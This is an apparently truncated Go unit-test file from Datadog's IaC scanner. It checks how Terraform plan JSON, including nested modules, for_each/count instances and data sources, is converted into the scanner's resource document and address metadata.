/*
 * Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
 *
 * This product includes software developed at Datadog (https://www.datadoghq.com)  Copyright 2024 Datadog, Inc.
 */
package json

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/DataDog/datadog-iac-scanner/pkg/model"
	"github.com/DataDog/datadog-iac-scanner/pkg/vfs"
	"github.com/stretchr/testify/require"
)

func TestPlanAddressesUsesPlanNativeKeys(t *testing.T) {
	doc := model.Document{TfplanMetaKey: map[string]interface{}{
		"aws_s3_bucket": map[string]interface{}{
			"web[0]": map[string]interface{}{"address": "module.stack.aws_s3_bucket.web[0]"},
		},
		"data.aws_caller_identity": map[string]interface{}{
			"current": map[string]interface{}{"address": "data.aws_caller_identity.current"},
		},
	}}
	require.Equal(t, map[model.PlanResourceKey]string{
		{Section: "aws_s3_bucket", Key: "web[0]"}:             "module.stack.aws_s3_bucket.web[0]",
		{Section: "data.aws_caller_identity", Key: "current"}: "data.aws_caller_identity.current",
	}, PlanAddresses(doc))
	require.Nil(t, PlanAddresses(model.Document{}))
}

func TestJson_parseTFPlan(t *testing.T) {
	type args struct {
		doc model.Document
	}

	tests := []struct {
		name    string
		args    args
		want    model.Document
		wantErr bool
	}{
		{
			name: "test - parse as tfplan",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]interface{}{},
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address":        "fakewebservices_database.prod_db",
									"mode":           "managed",
									"type":           "fakewebservices_database",
									"name":           "prod_db",
									"provider_name":  "registry.terraform.io/hashicorp/fakewebservices",
									"schema_version": 0,
									"values": map[string]interface{}{
										"name": "Production DB",
										"size": 256,
									},
									"sensitive_values": map[string]interface{}{},
								},
							},
						},
					},
					"resource_changes": []map[string]interface{}{},
					"configuration":    map[string]interface{}{},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"fakewebservices_database": map[string]interface{}{
						"prod_db": map[string]interface{}{
							"name": "Production DB",
							"size": (float64)(256),
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"fakewebservices_database": map[string]interface{}{
						"prod_db": map[string]interface{}{
							"address": "fakewebservices_database.prod_db",
						},
					},
				},
				"resource_changes": []interface{}{},
				"configuration":    map[string]interface{}{},
			},
			wantErr: false,
		},
		{
			name: "test - resource_changes and configuration pass through",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"values": map[string]interface{}{
										"bucket": "main-bucket",
									},
								},
							},
						},
					},
					"resource_changes": []map[string]interface{}{
						{
							"address": "aws_s3_bucket.main",
							"mode":    "managed",
							"type":    "aws_s3_bucket",
							"name":    "main",
							"change": map[string]interface{}{
								"actions": []string{"create"},
								"before":  nil,
								"after": map[string]interface{}{
									"acl": "private",
								},
								"after_unknown": map[string]interface{}{
									"bucket": true,
									"id":     true,
								},
							},
						},
					},
					"configuration": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"expressions": map[string]interface{}{
										"bucket": map[string]interface{}{
											"references": []string{"random_id.suffix"},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"bucket": "main-bucket",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_s3_bucket.main",
							"after_unknown": map[string]interface{}{
								"bucket": true,
								"id":     true,
							},
							"configuration_expressions": map[string]interface{}{
								"bucket": map[string]interface{}{
									"references": []interface{}{"random_id.suffix"},
								},
							},
						},
					},
				},
				"resource_changes": []interface{}{
					map[string]interface{}{
						"address": "aws_s3_bucket.main",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "main",
						"change": map[string]interface{}{
							"actions": []interface{}{"create"},
							"before":  nil,
							"after": map[string]interface{}{
								"acl": "private",
							},
							"after_unknown": map[string]interface{}{
								"bucket": true,
								"id":     true,
							},
						},
					},
				},
				"configuration": map[string]interface{}{
					"root_module": map[string]interface{}{
						"resources": []interface{}{
							map[string]interface{}{
								"address": "aws_s3_bucket.main",
								"mode":    "managed",
								"type":    "aws_s3_bucket",
								"name":    "main",
								"expressions": map[string]interface{}{
									"bucket": map[string]interface{}{
										"references": []interface{}{"random_id.suffix"},
									},
								},
							},
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - should not parse tfplan",
			args: args{
				doc: model.Document{
					"resource": map[string]interface{}{
						"name": "martin",
					},
				},
			},
			want:    model.Document{},
			wantErr: true,
		},
		{
			name: "test - multi-module with same resource type",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.main",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "main",
									"values": map[string]interface{}{
										"bucket": "main-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_instance.web",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.storage",
									"resources": []map[string]interface{}{
										{
											"address": "module.storage.aws_s3_bucket.backup",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "backup",
											"values": map[string]interface{}{
												"bucket": "backup-bucket",
												"acl":    "private",
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"bucket": "main-bucket",
							"acl":    "private",
						},
						"module.storage.backup": map[string]interface{}{
							"bucket": "backup-bucket",
							"acl":    "private",
						},
					},
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"instance_type": "t2.micro",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_s3_bucket.main",
						},
						"module.storage.backup": map[string]interface{}{
							"address": "module.storage.aws_s3_bucket.backup",
						},
					},
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"address": "aws_instance.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - same resource name in different modules is preserved with module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"values": map[string]interface{}{
										"instance_type": "t2.large",
										"tags": map[string]interface{}{
											"Environment": "production",
										},
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.staging",
									"resources": []map[string]interface{}{
										{
											"address": "module.staging.aws_instance.web",
											"mode":    "managed",
											"type":    "aws_instance",
											"name":    "web",
											"values": map[string]interface{}{
												"instance_type": "t2.micro",
												"tags": map[string]interface{}{
													"Environment": "staging",
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"instance_type": "t2.large",
							"tags": map[string]interface{}{
								"Environment": "production",
							},
						},
						"module.staging.web": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Environment": "staging",
							},
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web": map[string]interface{}{
							"address": "aws_instance.web",
						},
						"module.staging.web": map[string]interface{}{
							"address": "module.staging.aws_instance.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - deeply nested modules",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_vpc.main",
									"mode":    "managed",
									"type":    "aws_vpc",
									"name":    "main",
									"values": map[string]interface{}{
										"cidr_block": "10.0.0.0/16",
									},
								},
							},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.networking",
									"resources": []map[string]interface{}{
										{
											"address": "module.networking.aws_subnet.public",
											"mode":    "managed",
											"type":    "aws_subnet",
											"name":    "public",
											"values": map[string]interface{}{
												"cidr_block": "10.0.1.0/24",
											},
										},
									},
									"child_modules": []map[string]interface{}{
										{
											"address": "module.networking.module.security",
											"resources": []map[string]interface{}{
												{
													"address": "module.networking.module.security.aws_security_group.web",
													"mode":    "managed",
													"type":    "aws_security_group",
													"name":    "web",
													"values": map[string]interface{}{
														"description": "Web traffic",
													},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_vpc": map[string]interface{}{
						"main": map[string]interface{}{
							"cidr_block": "10.0.0.0/16",
						},
					},
					"aws_subnet": map[string]interface{}{
						"module.networking.public": map[string]interface{}{
							"cidr_block": "10.0.1.0/24",
						},
					},
					"aws_security_group": map[string]interface{}{
						"module.networking.module.security.web": map[string]interface{}{
							"description": "Web traffic",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_vpc": map[string]interface{}{
						"main": map[string]interface{}{
							"address": "aws_vpc.main",
						},
					},
					"aws_subnet": map[string]interface{}{
						"module.networking.public": map[string]interface{}{
							"address": "module.networking.aws_subnet.public",
						},
					},
					"aws_security_group": map[string]interface{}{
						"module.networking.module.security.web": map[string]interface{}{
							"address": "module.networking.module.security.aws_security_group.web",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - multiple sibling modules with same resource types is preserved with module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{},
							"child_modules": []map[string]interface{}{
								{
									"address": "module.app1",
									"resources": []map[string]interface{}{
										{
											"address": "module.app1.aws_s3_bucket.data",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "data",
											"values": map[string]interface{}{
												"bucket": "app1-data",
											},
										},
									},
								},
								{
									"address": "module.app2",
									"resources": []map[string]interface{}{
										{
											"address": "module.app2.aws_s3_bucket.data",
											"mode":    "managed",
											"type":    "aws_s3_bucket",
											"name":    "data",
											"values": map[string]interface{}{
												"bucket": "app2-data",
											},
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"module.app1.data": map[string]interface{}{
							"bucket": "app1-data",
						},
						"module.app2.data": map[string]interface{}{
							"bucket": "app2-data",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"module.app1.data": map[string]interface{}{
							"address": "module.app1.aws_s3_bucket.data",
						},
						"module.app2.data": map[string]interface{}{
							"address": "module.app2.aws_s3_bucket.data",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - count creates multiple resource instances",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web[0]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(0), // JSON numbers are float64
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-0",
											"Index": float64(0),
										},
									},
								},
								{
									"address": "aws_instance.web[1]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(1),
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-1",
											"Index": float64(1),
										},
									},
								},
								{
									"address": "aws_instance.web[2]",
									"mode":    "managed",
									"type":    "aws_instance",
									"name":    "web",
									"index":   float64(2),
									"values": map[string]interface{}{
										"instance_type": "t2.micro",
										"tags": map[string]interface{}{
											"Name":  "web-2",
											"Index": float64(2),
										},
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web[0]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-0",
								"Index": float64(0),
							},
						},
						"web[1]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-1",
								"Index": float64(1),
							},
						},
						"web[2]": map[string]interface{}{
							"instance_type": "t2.micro",
							"tags": map[string]interface{}{
								"Name":  "web-2",
								"Index": float64(2),
							},
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_instance": map[string]interface{}{
						"web[0]": map[string]interface{}{
							"address": "aws_instance.web[0]",
						},
						"web[1]": map[string]interface{}{
							"address": "aws_instance.web[1]",
						},
						"web[2]": map[string]interface{}{
							"address": "aws_instance.web[2]",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - for_each creates multiple resource instances",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]interface{}{
						"root_module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_s3_bucket.data[\"prod\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "prod",
									"values": map[string]interface{}{
										"bucket": "prod-data-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_s3_bucket.data[\"staging\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "staging",
									"values": map[string]interface{}{
										"bucket": "staging-data-bucket",
										"acl":    "private",
									},
								},
								{
									"address": "aws_s3_bucket.data[\"dev\"]",
									"mode":    "managed",
									"type":    "aws_s3_bucket",
									"name":    "data",
									"index":   "dev",
									"values": map[string]interface{}{
										"bucket": "dev-data-bucket",
										"acl":    "private",
									},
								},
							},
						},
					},
				},
			},
			want: model.Document{
				"resource": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"data[\"prod\"]": map[string]interface{}{
							"bucket": "prod-data-bucket",
							"acl":    "private",
						},
						"data[\"staging\"]": map[string]interface{}{
							"bucket": "staging-data-bucket",
							"acl":    "private",
						},
						"data[\"dev\"]": map[string]interface{}{
							"bucket": "dev-data-bucket",
							"acl":    "private",
						},
					},
				},
				"_dd_tfplan_meta": map[string]interface{}{
					"aws_s3_bucket": map[string]interface{}{
						"data[\"prod\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"prod\"]",
						},
						"data[\"staging\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"staging\"]",
						},
						"data[\"dev\"]": map[string]interface{}{
							"address": "aws_s3_bucket.data[\"dev\"]",
						},
					},
				},
			},
			wantErr: false,
		},
		{
			name: "test - injects resource values line from _dd_lines",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]any{},
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"_dd_lines": map[string]any{
								"_dd_resources": map[string]any{
									"_dd_arr": []map[string]any{
										{
											"_dd__default": map[string]any{"_dd_line": 5},
											"_dd_values":   map[string]any{"_dd_line": 7},
										},
									},
								},
							},
							"resources": []map[string]any{
								{
									"address": "fakewebservices_database.prod_db",
									"mode":    "managed",
									"type":    "fakewebservices_database",
									"name":    "prod_db",
									"values": map[string]any{
										"name": "Production DB",
										"size": 256,
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				"resource": map[string]any{
					"fakewebservices_database": map[string]any{
						"_dd_lines": map[string]any{
							"_dd_prod_db": map[string]any{"_dd_line": (float64)(7)},
						},
						"prod_db": map[string]any{
							"name": "Production DB",
							"size": (float64)(256),
						},
					},
				},
				"_dd_tfplan_meta": map[string]any{
					"fakewebservices_database": map[string]any{
						"prod_db": map[string]any{
							"address": "fakewebservices_database.prod_db",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - resolved data source in prior_state merged under data.<type>.<name>",
			args: args{
				doc: model.Document{
					"format_version":    "0.2",
					"terraform_version": "1.0.5",
					"variables":         map[string]any{},
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/aws/s3",
											"arn":    "arn:aws:kms:us-east-1:123456789012:key/abc",
											"id":     "abc",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				TfplanMetaKey: map[string]any{
					"data.aws_kms_key": map[string]any{
						"by_alias": map[string]any{"address": "data.aws_kms_key.by_alias"},
					},
				},
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						"by_alias": map[string]any{
							"key_id": "alias/aws/s3",
							"arn":    "arn:aws:kms:us-east-1:123456789012:key/abc",
							"id":     "abc",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - injects data source values line from _dd_lines under prior_state",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"_dd_lines": map[string]any{
									"_dd_resources": map[string]any{
										"_dd_arr": []map[string]any{
											{
												"_dd__default": map[string]any{"_dd_line": 5},
												"_dd_values":   map[string]any{"_dd_line": 14},
											},
										},
									},
								},
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/aws/s3",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				TfplanMetaKey: map[string]any{
					"data.aws_kms_key": map[string]any{
						"by_alias": map[string]any{"address": "data.aws_kms_key.by_alias"},
					},
				},
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						"_dd_lines": map[string]any{
							"_dd_by_alias": map[string]any{"_dd_line": (float64)(14)},
						},
						"by_alias": map[string]any{
							"key_id": "alias/aws/s3",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - data source scheduled for deletion in resource_changes is excluded from prior_state merge",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/aws/s3",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{
						{
							"address": "data.aws_kms_key.by_alias",
							"mode":    "data",
							"type":    "aws_kms_key",
							"name":    "by_alias",
							"change": map[string]any{
								"actions": []any{"delete"},
								"before":  map[string]any{"key_id": "alias/aws/s3"},
								"after":   nil,
							},
						},
					},
					"configuration": map[string]any{},
				},
			},
			want: model.Document{
				"resource":         map[string]any{},
				"resource_changes": []any{map[string]any{"address": "data.aws_kms_key.by_alias", "mode": "data", "type": "aws_kms_key", "name": "by_alias", "change": map[string]any{"actions": []any{"delete"}, "before": map[string]any{"key_id": "alias/aws/s3"}, "after": nil}}},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - for_each data source instances in prior_state keep distinct keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": `data.aws_kms_key.by_alias["prod"]`,
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"index":   "prod",
										"values": map[string]any{
											"key_id": "alias/prod",
										},
									},
									{
										"address": `data.aws_kms_key.by_alias["dev"]`,
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"index":   "dev",
										"values": map[string]any{
											"key_id": "alias/dev",
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				TfplanMetaKey: map[string]any{
					"data.aws_kms_key": map[string]any{
						`by_alias["prod"]`: map[string]any{"address": `data.aws_kms_key.by_alias["prod"]`},
						`by_alias["dev"]`:  map[string]any{"address": `data.aws_kms_key.by_alias["dev"]`},
					},
				},
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						`by_alias["prod"]`: map[string]any{
							"key_id": "alias/prod",
						},
						`by_alias["dev"]`: map[string]any{
							"key_id": "alias/dev",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
		{
			name: "test - same-name data source in root and child module keeps module-prefixed keys",
			args: args{
				doc: model.Document{
					"format_version":    "1.2",
					"terraform_version": "1.5.0",
					"planned_values": map[string]any{
						"root_module": map[string]any{
							"resources": []map[string]any{},
						},
					},
					"prior_state": map[string]any{
						"format_version": "1.0",
						"values": map[string]any{
							"root_module": map[string]any{
								"resources": []map[string]any{
									{
										"address": "data.aws_kms_key.by_alias",
										"mode":    "data",
										"type":    "aws_kms_key",
										"name":    "by_alias",
										"values": map[string]any{
											"key_id": "alias/root",
										},
									},
								},
								"child_modules": []map[string]any{
									{
										"address": "module.storage",
										"resources": []map[string]any{
											{
												"address": "module.storage.data.aws_kms_key.by_alias",
												"mode":    "data",
												"type":    "aws_kms_key",
												"name":    "by_alias",
												"values": map[string]any{
													"key_id": "alias/storage",
												},
											},
										},
									},
								},
							},
						},
					},
					"resource_changes": []map[string]any{},
					"configuration":    map[string]any{},
				},
			},
			want: model.Document{
				TfplanMetaKey: map[string]any{
					"data.aws_kms_key": map[string]any{
						"by_alias":                map[string]any{"address": "data.aws_kms_key.by_alias"},
						"module.storage.by_alias": map[string]any{"address": "module.storage.data.aws_kms_key.by_alias"},
					},
				},
				"resource": map[string]any{},
				"data": map[string]any{
					"aws_kms_key": map[string]any{
						"by_alias": map[string]any{
							"key_id": "alias/root",
						},
						"module.storage.by_alias": map[string]any{
							"key_id": "alias/storage",
						},
					},
				},
				"resource_changes": []any{},
				"configuration":    map[string]any{},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseTFPlan(tt.args.doc)
			if tt.wantErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
			require.Equal(t, tt.want, got)
			require.Equal(t, PlanAddresses(tt.want), PlanAddresses(got))
		})
	}
}

// TestJson_parseTFPlan_dd_tfplan_meta_correlation exercises _dd_tfplan_meta's
// direct-lookup contract, including for_each keys with a dot, "]", or quote.
func TestJson_parseTFPlan_dd_tfplan_meta_correlation(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_vpc.main",
						"mode":    "managed",
						"type":    "aws_vpc",
						"name":    "main",
						"values": map[string]interface{}{
							"cidr_block": "10.0.0.0/16",
						},
					},
					{
						"address": "aws_instance.web[0]",
						"mode":    "managed",
						"type":    "aws_instance",
						"name":    "web",
						"index":   float64(0),
						"values": map[string]interface{}{
							"instance_type": "t2.micro",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"prod\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "prod",
						"values": map[string]interface{}{
							"bucket": "prod-data-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a.b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a.b",
						"values": map[string]interface{}{
							"bucket": "dotted-key-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a]b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a]b",
						"values": map[string]interface{}{
							"bucket": "bracket-key-bucket",
						},
					},
					{
						"address": "aws_s3_bucket.data[\"a\\\"b\"]",
						"mode":    "managed",
						"type":    "aws_s3_bucket",
						"name":    "data",
						"index":   "a\"b",
						"values": map[string]interface{}{
							"bucket": "quote-key-bucket",
						},
					},
				},
				"child_modules": []map[string]interface{}{
					{
						"address": "module.networking",
						"resources": []map[string]interface{}{
							{
								"address": "module.networking.aws_subnet.public",
								"mode":    "managed",
								"type":    "aws_subnet",
								"name":    "public",
								"values": map[string]interface{}{
									"cidr_block": "10.0.1.0/24",
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{
			{
				"address": "aws_vpc.main",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_instance.web[0]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"arn": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"prod\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a.b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a]b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "aws_s3_bucket.data[\"a\\\"b\"]",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
			{
				"address": "module.networking.aws_subnet.public",
				"change": map[string]interface{}{
					"after_unknown": map[string]interface{}{"id": true},
				},
			},
		},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"resources": []map[string]interface{}{
					{
						"address": "aws_vpc.main",
						"expressions": map[string]interface{}{
							"cidr_block": map[string]interface{}{"constant_value": "10.0.0.0/16"},
						},
					},
					{
						"address": "aws_instance.web",
						"expressions": map[string]interface{}{
							"instance_type": map[string]interface{}{"references": []string{"var.instance_type"}},
						},
					},
					{
						"address": "aws_s3_bucket.data",
						"expressions": map[string]interface{}{
							"bucket": map[string]interface{}{"references": []string{"var.bucket_name"}},
						},
					},
				},
				"module_calls": map[string]interface{}{
					"networking": map[string]interface{}{
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_subnet.public",
									"expressions": map[string]interface{}{
										"cidr_block": map[string]interface{}{"references": []string{"var.subnet_cidr"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	meta := func(resourceType, key string) map[string]interface{} {
		ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta not found")
		typeMap, ok := ddMeta[resourceType].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta.%s not found", resourceType)
		entry, ok := typeMap[key].(map[string]interface{})
		require.True(t, ok, "_dd_tfplan_meta.%s.%s not found", resourceType, key)
		return entry
	}

	// _dd_tfplan_meta must never be nested inside resource.<type>.
	resourceTypes, ok := got["resource"].(map[string]interface{})
	require.True(t, ok)
	for resourceType, typeMap := range resourceTypes {
		asMap, ok := typeMap.(map[string]interface{})
		require.True(t, ok)
		require.NotContains(t, asMap, "_dd_tfplan_meta", "resource.%s must not contain _dd_tfplan_meta", resourceType)
	}

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_vpc.main",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"cidr_block": map[string]interface{}{"constant_value": "10.0.0.0/16"}},
	}, meta("aws_vpc", "main"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_instance.web[0]",
		"after_unknown":             map[string]interface{}{"arn": true},
		"configuration_expressions": map[string]interface{}{"instance_type": map[string]interface{}{"references": []interface{}{"var.instance_type"}}},
	}, meta("aws_instance", "web[0]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"prod\"]",
		"after_unknown":             map[string]interface{}{"id": true},
		"configuration_expressions": map[string]interface{}{"bucket": map[string]interface{}{"references": []interface{}{"var.bucket_name"}}},
	}, meta("aws_s3_bucket", "data[\"prod\"]"))

	require.Equal(t, map[string]interface{}{
		"address":                   "aws_s3_bucket.data[\"a.b\"]",
